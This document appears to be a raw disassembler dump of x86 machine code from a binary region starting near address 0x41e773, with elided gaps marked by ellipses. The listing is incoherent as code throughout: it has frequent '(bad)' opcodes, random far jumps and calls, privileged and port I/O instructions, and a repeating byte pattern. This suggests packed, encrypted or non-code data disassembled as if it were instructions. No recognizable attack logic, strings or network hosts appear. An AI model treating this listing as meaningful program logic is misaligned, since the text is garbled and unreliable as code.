  41e773:	clc    
  41e774:	xchg   edx,eax
  41e775:	out    dx,eax
  41e776:	lods   eax,DWORD PTR ds:[esi]
  41e777:	fwait
  41e778:	jp     0x41e780
  41e77a:	cmp    eax,edi
  41e77c:	and    esp,DWORD PTR [edi*2-0x448b6e04]
  41e783:	add    DWORD PTR ds:0xf3936297,eax
  41e789:	in     al,dx
  41e78a:	jnp    0x41e78b
  41e78c:	in     al,dx
  41e78d:	pop    ds
  41e78e:	les    ecx,FWORD PTR ds:0x159722f0
  41e794:	aaa    
  41e795:	fldenv [ecx]
  41e797:	inc    ebx
  41e798:	add    DWORD PTR ds:0xecff397f,eax
  41e79e:	cli    
  41e79f:	idiv   DWORD PTR [eax+edx*2+0x2b966d4c]
  41e7a6:	or     ah,BYTE PTR [esi+0x178f5bb1]
  41e7ac:	or     al,0x80
  41e7ae:	(bad)
  41e7b1:	xchg   edi,eax
  41e7b2:	mov    ah,0xd2
  41e7b4:	stos   DWORD PTR es:[edi],eax
  41e7b5:	mov    ebp,0xf7ec33c9
  41e7ba:	add    ah,BYTE PTR [eax+0x129820c9]
  41e7c0:	jge    0x41e7ad
  41e7c2:	xor    ah,ch
  41e7c4:	test   DWORD PTR [eax-0x31],0x409b00e4
  41e7cb:	fs int3 
  41e7cd:	adc    esi,DWORD PTR [ecx+0x40105007]
  41e7d3:	data16 sub ch,BYTE PTR [edi-0x1e85ae64]
  41e7da:	clc    
  41e7db:	rcl    DWORD PTR es:[ebx-0x31d001d3],0xe2
  41e7e3:	rcr    DWORD PTR [esi],cl
  41e7e5:	clc    
  41e7e6:	cdq    
  41e7e7:	push   0x6a
  41e7e9:	bound  eax,QWORD PTR [ebp-0x578959d7]
  41e7ef:	je     0x41e847
  41e7f1:	scas   al,BYTE PTR es:[edi]
  41e7f2:	pop    ds
  41e7f3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41e7f4:	sbb    ebx,DWORD PTR [esi+0x4b003173]
  41e7fa:	popa   
  41e7fb:	pop    ebx
  41e7fc:	xchg   esi,eax
  41e7fd:	mov    ds:0xef84d8a7,al
  41e802:	mov    ebp,0xfaa6092b
  41e807:	pop    ecx
  41e808:	lods   al,BYTE PTR ds:[esi]
  41e809:	add    BYTE PTR [eax-0x19d6aba7],ah
  41e80f:	imul   esp,eax,0xffffffa3
  41e812:	aam    0x90
  41e814:	leavew 
  41e816:	push   es
  41e817:	mov    ebp,0xd1ae583b
  41e81c:	push   ebp
  41e81d:	mov    ecx,0xf09b870c
  41e822:	jnp    0x41e879
  41e824:	pushf  
  41e825:	mov    eax,0x1508d6b8
  41e82a:	sbb    cl,al
  41e82c:	sbb    edi,DWORD PTR [edi+0x5060ab76]
  41e832:	sbb    cl,0xcf
  41e835:	(bad)  
  41e837:	jno    0x41e80b
  41e839:	(bad)  
  41e83a:	not    DWORD PTR [edi-0x7c91fd98]
  41e840:	xchg   edx,eax
  41e841:	mov    BYTE PTR [eax],al
	...
  41e8b3:	add    ah,al
  41e8b5:	ins    BYTE PTR es:[edi],dx
  41e8b6:	pop    es
  41e8b7:	pushf  
  41e8b8:	scas   eax,DWORD PTR es:[edi]
  41e8b9:	(bad)  
  41e8ba:	fistp  QWORD PTR [esi+eiz*4-0x50]
  41e8be:	loop   0x41e93a
  41e8c0:	push   es
  41e8c1:	mov    eax,0x4886cfe9
  41e8c6:	add    DWORD PTR [eax],eax
  41e8c8:	test   BYTE PTR [eax],0x0
  41e8cb:	add    BYTE PTR [ecx*1+0x743bb47d],dh
  41e8d2:	xor    BYTE PTR [esi-0x32],dl
  41e8d5:	outs   dx,BYTE PTR ds:[esi]
  41e8d6:	clc    
  41e8d7:	test   al,0x23
  41e8d9:	or     BYTE PTR [eax+eiz*2],cl
  41e8dc:	cmp    BYTE PTR [ebx-0x3a],bl
  41e8df:	dec    esi
  41e8e0:	les    eax,FWORD PTR [ebp+0x18]
  41e8e3:	push   es
  41e8e4:	pop    ebp
  41e8e5:	aaa    
  41e8e6:	sub    dl,bh
  41e8e8:	cs ja  0x41e938
  41e8eb:	jne    0x41e8ee
  41e8ed:	dec    ebx
  41e8ee:	and    ebx,ecx
  41e8f0:	int3   
  41e8f1:	adc    eax,0xabf60616
  41e8f6:	mov    esp,0x16f6e66b
  41e8fb:	sbb    DWORD PTR [edx+ebp*1],0x9d5d6e66
  41e902:	ds mov edi,0xc333557f
  41e908:	nop
  41e909:	sahf   
  41e90a:	jp     0x41e962
  41e90c:	or     al,0x51
  41e90e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41e90f:	dec    eax
  41e910:	sbb    BYTE PTR [edi+0x6537cfeb],dh
  41e916:	adc    dh,BYTE PTR [ebx-0x27]
  41e919:	popa   
  41e91a:	outs   dx,DWORD PTR ds:[esi]
  41e91b:	pop    edx
  41e91c:	sub    DWORD PTR [ebp-0x7d],0x6e
  41e920:	sbb    eax,0x592c43d7
  41e925:	or     dl,0x51
  41e928:	es jnp 0x41e971
  41e92b:	adc    DWORD PTR [ebp-0x1378b930],eax
  41e931:	sahf   
  41e932:	lock sbb eax,0x1a4e34d8
  41e938:	mov    dh,BYTE PTR [edi]
  41e93a:	cdq    
  41e93b:	mov    ecx,0x274cbba4
  41e940:	xchg   DWORD PTR [ebx+ebp*4-0x56],ecx
  41e944:	ins    BYTE PTR es:[edi],dx
  41e945:	and    al,ah
  41e947:	push   esi
  41e948:	fwait
  41e949:	call   0x5fb50650
  41e94e:	or     eax,0xa06b1f68
  41e953:	daa    
  41e954:	aas    
  41e955:	jo     0x41e932
  41e957:	or     al,0x9b
  41e959:	and    bl,BYTE PTR [eax+esi*1-0x6bf9b913]
  41e960:	lea    edx,[ecx-0x2d]
  41e963:	inc    ebx
  41e964:	in     al,dx
  41e965:	add    DWORD PTR [ebx-0x72],esp
  41e968:	lea    esi,[edi+esi*4]
  41e96b:	repz idiv BYTE PTR [edx-0x2]
  41e96f:	sbb    al,0x2a
  41e971:	lods   eax,DWORD PTR ds:[esi]
  41e972:	jg     0x41e9e3
  41e974:	icebp  
  41e975:	mov    cl,0x78
  41e977:	dec    edi
  41e978:	fs ret 0x6367
  41e97c:	repnz enter 0x3d73,0x9a
  41e981:	in     al,dx
  41e982:	sub    ecx,DWORD PTR [ebp+edx*4+0x5eb16870]
  41e989:	iret   
  41e98a:	iret   
  41e98b:	xchg   DWORD PTR [edx-0x229db8c6],eax
  41e991:	std    
  41e992:	mov    edx,0xe2218abe
  41e997:	cmp    ebx,edx
  41e999:	pusha  
  41e99a:	sbb    BYTE PTR [edx-0xb],0xd3
  41e99e:	leave  
  41e99f:	mov    dl,0x67
  41e9a1:	cmp    al,0xd2
  41e9a3:	test   al,0xc
  41e9a5:	dec    ebx
  41e9a6:	sub    al,0xb5
  41e9a8:	add    DWORD PTR [ecx],edi
  41e9aa:	shl    BYTE PTR [esp+ebx*2],0xbd
  41e9ae:	mov    BYTE PTR [ecx+0x4d287b65],dh
  41e9b4:	out    0x28,eax
  41e9b6:	pop    es
  41e9b7:	xchg   ebp,eax
  41e9b8:	repnz fmul st,st(0)
  41e9bb:	push   ss
  41e9bc:	mov    al,ds:0x31b762af
  41e9c1:	stos   BYTE PTR es:[edi],al
	...
  41ea32:	add    BYTE PTR [eax],al
  41ea34:	sbb    al,0x15
  41ea36:	jnp    0x41ea8b
  41ea38:	jnp    0x41eab9
  41ea3a:	cmp    al,0x5f
  41ea3c:	les    ecx,FWORD PTR [ebx+0x21]
  41ea3f:	frstor [edi+0x75]
  41ea42:	addr16 jmp 0xf6:0x1497c
  41ea4a:	add    BYTE PTR [eax],al
  41ea4c:	xor    bh,BYTE PTR [edx-0x3c]
  41ea4f:	pop    edx
  41ea50:	std    
  41ea51:	xchg   ebx,eax
  41ea52:	mov    al,0xe8
  41ea54:	lock xchg ebp,eax
  41ea56:	push   ds
  41ea57:	mov    ds:0x27c9c923,al
  41ea5c:	mov    esp,0x1ee2e5bd
  41ea61:	cmp    bh,BYTE PTR [ecx]
  41ea63:	fcmovb st,st(6)
  41ea65:	push   eax
  41ea66:	xor    BYTE PTR [ecx-0x70b1a285],bh
  41ea6c:	and    esi,DWORD PTR [edx+0xd]
  41ea6f:	cld    
  41ea70:	and    eax,0x4e51c459
  41ea75:	in     eax,0x43
  41ea77:	push   es
  41ea78:	(bad)  
  41ea79:	xchg   esi,eax
  41ea7a:	(bad)  
  41ea7c:	dec    ebp
  41ea7d:	add    eax,0xc30ed2f8
  41ea82:	in     al,0x12
  41ea84:	sbb    BYTE PTR [ecx],dl
  41ea86:	sbb    bl,ah
  41ea88:	cmp    edx,DWORD PTR [edi+0x5b5ddc7e]
  41ea8e:	cmp    edx,eax
  41ea90:	cmp    edx,DWORD PTR [esi-0x5a]
  41ea93:	pop    esp
  41ea94:	mov    ebx,0xaa570d54
  41ea99:	xchg   ah,cl
  41ea9b:	out    dx,eax
  41ea9c:	adc    ebp,0x344d697
  41eaa2:	adc    BYTE PTR [ecx+ebp*2-0x97d9ce2],bh
  41eaa9:	mov    BYTE PTR [ebx+0x307796d8],al
  41eaaf:	mov    ch,0x2d
  41eab1:	jns    0x41eab7
  41eab3:	repnz mov ds:0x5872a541,eax
  41eab9:	sti    
  41eaba:	call   0xe627032b
  41eabf:	inc    ebp
  41eac0:	shl    ecx,1
  41eac2:	push   ds
  41eac3:	xor    eax,0xef74031b
  41eac8:	aam    0xd9
  41eaca:	mov    ebp,0x70677133
  41eacf:	add    ecx,DWORD PTR [ecx]
  41ead1:	pop    es
  41ead2:	add    eax,0x160a71ac
  41ead7:	out    dx,eax
  41ead8:	or     edi,ebp
  41eada:	inc    eax
  41eadb:	out    dx,eax
  41eadc:	retf   
  41eadd:	add    al,0x70
  41eadf:	dec    eax
  41eae0:	std    
  41eae1:	push   es
  41eae2:	adc    BYTE PTR [edx],dh
  41eae4:	cmp    DWORD PTR [edi-0x42],eax
  41eae7:	xor    BYTE PTR [edx+0x61005af0],al
  41eaed:	cwde   
  41eaee:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41eaef:	push   ds
  41eaf0:	xor    DWORD PTR [ecx+edx*1-0x44d866fe],ebp
  41eaf7:	lds    edi,FWORD PTR [esi-0x5d33480d]
  41eafd:	pusha  
  41eafe:	gs push ebp
  41eb00:	add    al,0x53
  41eb02:	cmp    al,0x93
  41eb04:	int    0x87
  41eb06:	dec    edx
  41eb07:	and    ecx,ebx
  41eb09:	dec    ebp
  41eb0a:	mov    esp,0x816c4f59
  41eb0f:	cmp    DWORD PTR [ebx-0x6d],ebx
  41eb12:	and    BYTE PTR [ecx+0x4c],cl
  41eb15:	rol    BYTE PTR [ecx+0x0],1
  41eb18:	cli    
  41eb19:	jg     0x41eaaa
  41eb1b:	add    DWORD PTR [ebp-0x7d37c379],eax
  41eb21:	or     al,0xa2
  41eb23:	into   
  41eb24:	dec    edx
  41eb26:	sub    al,0x52
  41eb28:	fwait
  41eb29:	xor    BYTE PTR [ebx-0x34708ea2],bl
  41eb2f:	mov    BYTE PTR [edi-0xcc5490c],dh
  41eb35:	sub    BYTE PTR [ebx+0x635c73fc],bh
  41eb3b:	stos   BYTE PTR es:[edi],al
  41eb3c:	cdq    
  41eb3d:	test   al,0x52
  41eb3f:	sbb    eax,0x3be5
	...
  41ebb4:	outs   dx,DWORD PTR ds:[esi]
  41ebb5:	retf   0x9815
  41ebb8:	mov    ch,0xdf
  41ebba:	out    dx,eax
  41ebbb:	inc    DWORD PTR [ebx+0x1e]
  41ebbe:	arpl   sp,si
  41ebc0:	xor    DWORD PTR [esi+0x4a723fdc],ecx
  41ebc6:	add    DWORD PTR [eax],eax
  41ebc8:	test   BYTE PTR [eax],0x0
  41ebcb:	add    bh,dh
  41ebcd:	fstp   QWORD PTR [ecx+0x40]
  41ebd0:	xchg   ebp,eax
  41ebd1:	pusha  
  41ebd2:	adc    al,0xbb
  41ebd4:	shl    BYTE PTR [edi],0x93
  41ebd7:	fidivr DWORD PTR [ebx]
  41ebd9:	imul   esi,DWORD PTR [ecx-0x60],0xffffffa4
  41ebdd:	or     bl,BYTE PTR [eax+0x597775e]
  41ebe3:	or     DWORD PTR [eax+0x31],0xaf0f0824
  41ebea:	out    0xd1,eax
  41ebec:	and    eax,0xe91ba68b
  41ebf1:	jecxz  0x41eb8a
  41ebf3:	hlt    
  41ebf4:	out    dx,al
  41ebf5:	loop   0x41eba4
  41ebf7:	loope  0x41ec63
  41ebf9:	sbb    al,BYTE PTR [edi]
  41ebfb:	(bad)  [edi]
  41ebfd:	loop   0x41ec2a
  41ebff:	mov    al,ds:0x4ce10e82
  41ec04:	push   edi
  41ec05:	popf   
  41ec06:	rol    BYTE PTR [esi],cl
  41ec08:	mov    dh,0xad
  41ec0a:	jle    0x41ebbe
  41ec0c:	pop    esi
  41ec0d:	stos   BYTE PTR es:[edi],al
  41ec0e:	adc    BYTE PTR [ebx],al
  41ec10:	mov    WORD PTR [ebp-0x1a5b919f],?
  41ec16:	cmp    al,0x76
  41ec18:	xchg   DWORD PTR [ebp-0x35],ecx
  41ec1b:	mov    BYTE PTR [ebx-0x22],ch
  41ec1e:	dec    esi
  41ec1f:	push   edx
  41ec20:	jmp    0x35f28433
  41ec25:	jmp    0x8027:0x716017
  41ec2c:	push   esp
  41ec2d:	ror    ebx,0x5c
  41ec30:	push   esp
  41ec31:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ec32:	pop    edi
  41ec33:	bound  esp,QWORD PTR [ebx]
  41ec35:	fwait
  41ec36:	inc    ebx
  41ec37:	sbb    esp,DWORD PTR [eax-0x70]
  41ec3a:	mov    edx,0x6bd51c3
  41ec3f:	scas   eax,DWORD PTR es:[edi]
  41ec40:	cwde   
  41ec41:	bound  edx,QWORD PTR [esi+0x74]
  41ec44:	retf   0xe867
  41ec47:	popf   
  41ec48:	xor    al,0xe1
  41ec4a:	cs push edi
  41ec4c:	sbb    al,0xdf
  41ec4e:	pop    ebx
  41ec4f:	sub    BYTE PTR [ebp-0x45],bh
  41ec52:	push   ecx
  41ec53:	mov    ch,0xbd
  41ec55:	daa    
  41ec56:	jmp    0x53b7:0x4a20e36e
  41ec5d:	or     BYTE PTR [esi+0x32f0b8f0],al
  41ec63:	test   cl,0x2c
  41ec66:	sbb    eax,0x673556ce
  41ec6b:	dec    esi
  41ec6c:	mov    bh,0x43
  41ec6e:	pop    ss
  41ec6f:	pop    ebp
  41ec70:	jnp    0x41ec35
  41ec72:	and    eax,0xfaeaa2e1
  41ec77:	stos   DWORD PTR es:[edi],eax
  41ec78:	xchg   ecx,eax
  41ec79:	int3   
  41ec7a:	daa    
  41ec7b:	mov    esi,0xfcb1dc1
  41ec80:	fs scas eax,DWORD PTR es:[edi]
  41ec82:	cmp    esi,edi
  41ec84:	fisubr DWORD PTR [ebp-0x7d395fce]
  41ec8a:	fs or  dh,bl
  41ec8d:	mov    al,0x43
  41ec8f:	pop    eax
  41ec90:	out    0x40,al
  41ec92:	rcl    DWORD PTR [edx-0x51100da0],cl
  41ec98:	das    
  41ec99:	and    eax,0xc5e0ea91
  41ec9e:	lahf   
  41ec9f:	test   al,0xb3
  41eca1:	pop    ecx
  41eca2:	cmc    
  41eca3:	xlat   BYTE PTR ds:[ebx]
  41eca4:	ins    DWORD PTR es:[edi],dx
  41eca5:	adc    cl,cl
  41eca7:	hlt    
  41eca8:	shr    DWORD PTR [esi-0x7555b67e],0x9c
  41ecaf:	cmp    al,BYTE PTR [ecx-0x2705768c]
  41ecb5:	and    DWORD PTR [ecx-0x7e],esp
  41ecb8:	mov    edx,?
  41ecba:	(bad)  
  41ecbc:	lea    ebx,[eax+0x62]
  41ecbf:	rcr    DWORD PTR ss:[ebp+0x0],cl
	...
  41ed33:	add    BYTE PTR [eax],ah
  41ed35:	repz das 
  41ed37:	cmp    bh,0xde
  41ed3a:	lods   eax,DWORD PTR ds:[esi]
  41ed3b:	repz xlat BYTE PTR ds:[ebx]
  41ed3d:	in     al,dx
  41ed3e:	pusha  
  41ed3f:	out    dx,al
  41ed40:	lods   eax,DWORD PTR ds:[esi]
  41ed41:	pop    es
  41ed42:	enter  0x6862,0x4b
  41ed46:	add    DWORD PTR [eax],eax
  41ed48:	test   BYTE PTR [eax],0x0
  41ed4b:	add    dh,al
  41ed4d:	fwait
  41ed4e:	xchg   edi,eax
  41ed4f:	rcr    BYTE PTR [ebx+eax*2+0x6e],0x6c
  41ed54:	mov    bh,BYTE PTR [esi]
  41ed56:	test   eax,0x5004a480
  41ed5b:	mov    ebp,0xf501a55d
  41ed60:	dec    eax
  41ed61:	daa    
  41ed62:	push   es
  41ed63:	jae    0x41edbe
  41ed65:	inc    ebp
  41ed66:	xchg   DWORD PTR [edi-0x688fbdb3],esi
  41ed6c:	inc    ecx
  41ed6d:	pop    esp
  41ed6e:	xchg   esp,eax
  41ed6f:	mov    esi,0x27683df0
  41ed74:	fnstenv [esi-0x30]
  41ed77:	int    0x59
  41ed79:	addr16 mov eax,0x970b75e7
  41ed7f:	cli    
  41ed80:	push   edi
  41ed81:	xchg   ebp,eax
  41ed82:	xchg   ecx,eax
  41ed83:	jae    0x41ed7c
  41ed85:	xchg   edx,eax
  41ed86:	inc    edx
  41ed87:	and    DWORD PTR [ecx-0x481e285d],ecx
  41ed8d:	xor    BYTE PTR [ecx+edi*8],dl
  41ed90:	xchg   esp,eax
  41ed91:	(bad)  
  41ed92:	push   ebx
  41ed93:	inc    ecx
  41ed94:	mov    eax,ds:0xcf019001
  41ed99:	lods   eax,DWORD PTR ds:[esi]
  41ed9a:	mov    bh,0x35
  41ed9c:	mov    bl,0xcf
  41ed9e:	fwait
  41ed9f:	sbb    DWORD PTR [edx+eiz*8-0x38],esi
  41eda3:	imul   ebp,edx,0xffffffd6
  41eda6:	in     eax,0xd4
  41eda8:	popa   
  41eda9:	aaa    
  41edaa:	push   ds
  41edab:	lahf   
  41edac:	ss pop edi
  41edae:	cli    
  41edaf:	frstor ds:0x2d0b9ce0
  41edb5:	xchg   DWORD PTR [edx-0x2d38f618],ecx
  41edbb:	dec    esi
  41edbc:	inc    BYTE PTR [ebp+ebp*1-0x39]
  41edc0:	dec    ebp
  41edc1:	xchg   DWORD PTR [ecx-0x314422e0],esp
  41edc7:	(bad)  
  41edc9:	xor    eax,0xe3e75263
  41edce:	xor    BYTE PTR [ebx+0x7952e808],dh
  41edd4:	add    eax,0x30a1f741
  41edd9:	(bad)  
  41edda:	aam    0xa1
  41eddc:	mov    dh,0xdd
  41edde:	push   es
  41eddf:	int3   
  41ede0:	clc    
  41ede1:	out    dx,al
  41ede2:	lods   al,BYTE PTR ds:[esi]
  41ede3:	dec    ebp
  41ede4:	sbb    DWORD PTR [eax-0x71bf8b69],ecx
  41edea:	push   ebx
  41edeb:	(bad)
  41edef:	inc    ecx
  41edf0:	mov    esp,0xb54f6729
  41edf5:	dec    eax
  41edf6:	push   ebx
  41edf7:	(bad)  
  41edf9:	add    dh,dl
  41edfb:	in     al,0xa4
  41edfd:	dec    esp
  41edfe:	mov    al,ds:0xae82b709
  41ee03:	cmp    eax,DWORD PTR es:[ebx+0x4bfb6375]
  41ee0a:	jle    0x41ee45
  41ee0c:	or     dl,dl
  41ee0e:	retf   0xa465
  41ee11:	(bad)  
  41ee13:	lods   eax,DWORD PTR ds:[esi]
  41ee14:	xlat   BYTE PTR ds:[ebx]
  41ee15:	mov    eax,ds:0x2448ad92
  41ee1a:	dec    eax
  41ee1b:	ret    
  41ee1c:	out    dx,al
  41ee1d:	push   ebx
  41ee1e:	pop    ebp
  41ee1f:	dec    eax
  41ee20:	jl     0x41edac
  41ee22:	fcmovnbe st,st(6)
  41ee24:	and    al,0xaf
  41ee26:	xchg   edx,eax
  41ee27:	fwait
  41ee28:	pop    es
  41ee29:	adc    DWORD PTR [ebx-0x64],0x8c47a5b8
  41ee30:	mov    eax,edx
  41ee32:	dec    eax
  41ee33:	cs leave 
  41ee35:	bound  ebp,QWORD PTR [ebx]
  41ee37:	scas   al,BYTE PTR es:[edi]
  41ee38:	in     al,0x1f
  41ee3a:	adc    BYTE PTR [eax-0x9],cl
  41ee3d:	stos   BYTE PTR es:[edi],al
  41ee3e:	shl    edi,1
  41ee40:	sbb    al,0x9f
	...
  41eeb2:	add    BYTE PTR [eax],al
  41eeb4:	aas    
  41eeb5:	daa    
  41eeb6:	push   ss
  41eeb7:	cld    
  41eeb8:	push   ds
  41eeb9:	std    
  41eeba:	jmp    edi
  41eebc:	push   eax
  41eebd:	jg     0x41eee4
  41eebf:	push   esp
  41eec0:	sub    eax,0x5e297ff3
  41eec5:	dec    esp
  41eec6:	add    DWORD PTR [eax],eax
  41eec8:	test   BYTE PTR [eax],0x0
  41eecb:	add    BYTE PTR [ecx-0x2e138fbd],bl
  41eed1:	pusha  
  41eed2:	cmp    BYTE PTR [ecx],bl
  41eed4:	out    0x18,al
  41eed6:	aaa    
  41eed7:	sbb    eax,0x12c3b1d7
  41eedc:	(bad)  
  41eedd:	jmp    ebx
  41eedf:	push   ebx
  41eee0:	jb     0x41eefa
  41eee2:	cs jmp 0xf965:0xc4e31763
  41eeea:	push   ds
  41eeeb:	in     eax,0x13
  41eeed:	hlt    
  41eeee:	sbb    eax,0x28d1975d
  41eef3:	ja     0x41ef39
  41eef5:	mov    cl,0xf6
  41eef7:	jge    0x41ef5c
  41eef9:	stos   DWORD PTR es:[edi],eax
  41eefa:	add    DWORD PTR [edx],esp
  41eefc:	cmp    al,0xf4
  41eefe:	jns    0x41ef69
  41ef00:	fisttp DWORD PTR [edi+eiz*8+0x45ce8dee]
  41ef07:	aas    
  41ef08:	jg     0x41eefe
  41ef0a:	pop    ds
  41ef0b:	dec    ebp
  41ef0c:	pop    es
  41ef0d:	cmc    
  41ef0e:	or     al,0xc4
  41ef10:	je     0x41eece
  41ef12:	mov    ebx,0x89075e3d
  41ef17:	or     al,0x1f
  41ef19:	addr16 pop esp
  41ef1b:	cmc    
  41ef1c:	push   edx
  41ef1d:	jae    0x41ef3d
  41ef1f:	adc    ch,0x64
  41ef22:	test   eax,0x98c7fe83
  41ef27:	jb     0x41eeae
  41ef29:	and    BYTE PTR [ecx+0x21],0x4d
  41ef2d:	add    eax,0xe79f6f4c
  41ef32:	jmp    0x41eeb4
  41ef34:	ja     0x41eee6
  41ef36:	int    0x32
  41ef38:	in     eax,0x6c
  41ef3a:	mov    BYTE PTR [esi+0x46d6abe1],bh
  41ef40:	imul   edx,DWORD PTR [esi-0x2536cb42],0x10e6fbab
  41ef4a:	sti    
  41ef4b:	fwait
  41ef4c:	test   DWORD PTR [ebx+0x46],0x7395659d
  41ef53:	add    DWORD PTR [edx+0x44acc911],edi
  41ef59:	mov    edi,0x98cc8a88
  41ef5e:	add    al,0xe6
  41ef60:	and    eax,0x79f00d88
  41ef65:	(bad)  
  41ef66:	fild   DWORD PTR [edx]
  41ef68:	mov    esi,0xfcf5ce0d
  41ef6d:	int    0x62
  41ef6f:	inc    esp
  41ef70:	rcl    BYTE PTR [esi],0xe3
  41ef73:	aam    0x43
  41ef75:	jmp    0xf5f2:0x9828e7fc
  41ef7c:	mov    BYTE PTR [edx-0x77bfac1c],bh
  41ef82:	sar    DWORD PTR es:[esp+eax*1],1
  41ef86:	xchg   esi,eax
  41ef87:	add    DWORD PTR [ebx+ebx*1+0x42],edx
  41ef8b:	aas    
  41ef8c:	pusha  
  41ef8d:	bound  ecx,QWORD PTR [ebp-0x50942b7a]
  41ef93:	push   es
  41ef94:	sub    eax,0xb5441974
  41ef99:	jle    0x41efec
  41ef9b:	fisub  DWORD PTR [edi+0x3a]
  41ef9e:	shr    BYTE PTR [ebx-0x56f270a7],0x7d
  41efa5:	in     eax,dx
  41efa6:	adc    BYTE PTR [esi+0x426f8e7d],0x4a
  41efad:	lea    ebx,[ebp+0x32]
  41efb0:	sbb    al,0x55
  41efb2:	test   eax,0x669b72cc
  41efb7:	mov    al,0x22
  41efb9:	(bad)  [edi+0x1a]
  41efbc:	pop    ss
  41efbd:	xor    eax,0xf131d09f
	...
  41f032:	add    BYTE PTR [eax],al
  41f034:	dec    edi
  41f035:	push   ebx
  41f036:	add    al,0xc
  41f038:	sbb    al,0x5f
  41f03a:	dec    edi
  41f03b:	push   ebx
  41f03c:	cwde   
  41f03d:	adc    edi,DWORD PTR [ebp+ecx*4-0x22]
  41f041:	cmc    
  41f042:	in     eax,0x35
  41f044:	push   esp
  41f045:	dec    ebp
  41f046:	add    DWORD PTR [eax],eax
  41f048:	test   BYTE PTR [eax],0x0
  41f04b:	add    BYTE PTR [eax+0x7e],ch
  41f04e:	aas    
  41f04f:	pop    edi
  41f050:	mov    dh,0x99
  41f052:	cmp    al,0x71
  41f054:	pop    ds
  41f055:	dec    ebx
  41f056:	sbb    ebp,DWORD PTR [edx-0x4ced9e89]
  41f05c:	xchg   edx,eax
  41f05d:	scas   eax,DWORD PTR es:[edi]
  41f05e:	daa    
  41f05f:	adc    BYTE PTR ds:0x49400752,al
  41f065:	add    BYTE PTR [ebx+0x40],bl
  41f068:	pop    ebx
  41f069:	mov    eax,DWORD PTR [ebp+0x10d0e93e]
  41f06f:	rol    BYTE PTR [ecx+ebp*2],0x5
  41f073:	push   0x30
  41f075:	jle    0x41effc
  41f077:	cld    
  41f078:	mov    dl,0xdc
  41f07a:	sub    eax,0x69d4c98a
  41f07f:	mov    ebp,0xf46c8ad4
  41f084:	in     al,0x1a
  41f086:	bound  ebx,QWORD PTR [ebx-0x3e]
  41f089:	int    0x3
  41f08b:	shl    BYTE PTR [edi],0x40
  41f08e:	stos   BYTE PTR es:[edi],al
  41f08f:	es dec esi
  41f091:	pop    ss
  41f092:	mov    eax,ds:0xe8932675
  41f097:	sub    cl,0x39
  41f09a:	jle    0x41f0d0
  41f09c:	mov    edx,0xce69c553
  41f0a1:	pop    ds
  41f0a2:	xor    al,0xa5
  41f0a4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f0a5:	sub    DWORD PTR [edi+0x22],eax
  41f0a8:	lock gs aas 
  41f0ab:	aaa    
  41f0ac:	mov    DWORD PTR ds:0xebe8029e,ebp
  41f0b2:	and    eax,0x78f521ca
  41f0b7:	fcmovnu st,st(3)
  41f0b9:	jbe    0x41f111
  41f0bb:	mov    al,ds:0x14add8c
  41f0c0:	fwait
  41f0c1:	push   ds
  41f0c2:	retf   0x6ab2
  41f0c5:	sbb    al,0xb9
  41f0c7:	jnp    0x41f0b2
  41f0c9:	ins    DWORD PTR es:[edi],dx
  41f0ca:	mov    edx,0xf1d35281
  41f0cf:	mov    eax,0xdc20b9c9
  41f0d4:	mov    esi,0x316eb87
  41f0d9:	cdq    
  41f0da:	fwait
  41f0db:	jmp    0x28e909ad
  41f0e0:	cmp    ebp,DWORD PTR [ebp+0x19480607]
  41f0e6:	outs   dx,BYTE PTR ds:[esi]
  41f0e7:	pushf  
  41f0e8:	ficom  DWORD PTR [edi+0x63]
  41f0eb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f0ec:	leave  
  41f0ed:	dec    edx
  41f0ee:	loopne 0x41f16b
  41f0f0:	icebp  
  41f0f1:	jp     0x41f128
  41f0f3:	neg    esp
  41f0f5:	add    eax,0x814a32d9
  41f0fa:	dec    ebx
  41f0fb:	sbb    BYTE PTR [edx-0x4e],al
  41f0fe:	mov    al,ds:0xb842cf63
  41f103:	sub    al,0x99
  41f105:	and    DWORD PTR ds:0x484ca544,0x94c5bc15
  41f10f:	fimul  DWORD PTR [ebx-0x70]
  41f112:	ret    0x69e1
  41f115:	nop
  41f116:	and    al,0xb9
  41f118:	push   ebx
  41f119:	sbb    BYTE PTR [eax],bh
  41f11b:	out    dx,al
  41f11c:	popf   
  41f11d:	int    0x55
  41f11f:	adc    edi,DWORD PTR [esi-0x5fba0595]
  41f125:	retf   
  41f126:	push   eax
  41f127:	mov    dl,0xa
  41f129:	xchg   ecx,eax
  41f12a:	mov    ebx,0xebfa278d
  41f12f:	sbb    al,0x4c
  41f131:	jl     0x41f199
  41f133:	(bad)  
  41f134:	pop    ebx
  41f135:	push   ecx
  41f136:	retf   0xaa23
  41f139:	inc    edi
  41f13a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f13b:	dec    ebx
  41f13c:	push   ecx
  41f13d:	pop    ebx
  41f13e:	push   0xfb6add
	...
  41f1b3:	add    BYTE PTR [ebx-0x1988fe],ch
  41f1b9:	idiv   DWORD PTR [ebx-0x11ecebb1]
  41f1bf:	mov    DWORD PTR [edx+0x4ad445b8],ebp
  41f1c5:	dec    esi
  41f1c6:	add    DWORD PTR [eax],eax
  41f1c8:	test   BYTE PTR [eax],0x0
  41f1cb:	add    BYTE PTR [ebp-0x2d],dl
  41f1ce:	nop
  41f1cf:	pop    esi
  41f1d0:	inc    eax
  41f1d1:	in     eax,0x3c
  41f1d3:	lock push cs
  41f1d5:	adc    ah,BYTE PTR [edx]
  41f1d7:	stos   BYTE PTR es:[edi],al
  41f1d8:	sbb    eax,0x6a76b795
  41f1dd:	test   al,0x8c
  41f1df:	cmp    al,0x91
  41f1e1:	mov    edx,0xe556a6b2
  41f1e6:	xchg   ecx,eax
  41f1e7:	sub    DWORD PTR [edi],0xd3b09048
  41f1ed:	mov    dh,0x27
  41f1ef:	cmp    eax,0x4b0b1dae
  41f1f4:	adc    ebx,DWORD PTR [ecx+0x6691508d]
  41f1fa:	xchg   esp,eax
  41f1fb:	pusha  
  41f1fc:	ins    BYTE PTR es:[edi],dx
  41f1fd:	xor    eax,0xa9a3b4bd
  41f202:	inc    ebx
  41f203:	push   cs
  41f204:	xchg   DWORD PTR [ecx+0x75d6f672],edi
  41f20a:	jmp    0xc370:0xb6550514
  41f211:	ret    0x6a2c
